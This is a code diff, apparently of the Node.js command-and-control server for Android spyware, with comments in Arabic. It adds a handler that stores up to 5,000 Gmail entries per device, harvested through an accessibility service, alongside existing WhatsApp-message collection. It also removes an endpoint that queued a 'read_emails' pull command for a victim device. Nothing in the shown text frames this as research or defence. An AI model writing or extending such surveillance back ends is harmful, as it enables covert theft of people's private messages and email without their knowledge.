@@ -96,6 +96,34 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, wa_count: waMessages.length });
         }
         
+        // ✅ حفظ كل البريد من Accessibility
+        if (data.type === 'all_emails') {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            
+            const emailFile = path.join(deviceDir, 'emails.json');
+            let emails = [];
+            if (fs.existsSync(emailFile)) emails = JSON.parse(fs.readFileSync(emailFile, 'utf8'));
+            
+            if (data.emails && data.emails.length > 0) {
+                data.emails.forEach(email => {
+                    emails.unshift({
+                        app_name: 'Gmail',
+                        sender: 'Gmail',
+                        subject: email.content || '',
+                        timestamp: email.timestamp || Date.now()
+                    });
+                });
+            }
+            
+            if (emails.length > 5000) emails = emails.slice(0, 5000);
+            
+            fs.writeFileSync(emailFile, JSON.stringify(emails, null, 2));
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true, email_count: emails.length });
+        }
+        
         // ✅ حفظ رسائل البريد الإلكتروني
         if (data.type === 'email_message') {
             const deviceId = data.device_id || 'unknown';
@@ -295,18 +323,6 @@ app.get('/api.php', (req, res) => {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
             return res.json([]);
-        }
-        
-        // ✅ أمر سحب كل البريد
-        if (action === 'read_emails') {
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const commandsFile = path.join(deviceDir, 'commands.json');
-            let commands = [];
-            if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
-            commands.push({ command: 'read_emails', timestamp: Math.floor(Date.now()/1000), status: 'pending' });
-            fs.writeFileSync(commandsFile, JSON.stringify(commands));
-            return res.json({ success: true });
         }
         
         // ✅ استرجاع رسائل البريد
